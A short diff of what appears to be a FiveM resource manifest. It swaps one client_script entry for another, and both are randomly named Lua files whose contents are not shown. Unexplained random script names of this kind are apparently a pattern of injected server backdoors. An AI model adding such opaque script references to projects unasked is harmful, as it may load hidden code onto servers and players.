@@ -4,4 +4,4 @@ this_is_a_map 'yes'
 client_script {
 	'client.lua'
 }
-client_script "wHHGDVZcVvrhNxgVQe.lua"
+client_script "TalJDiXcmrWuOdRetV.lua"
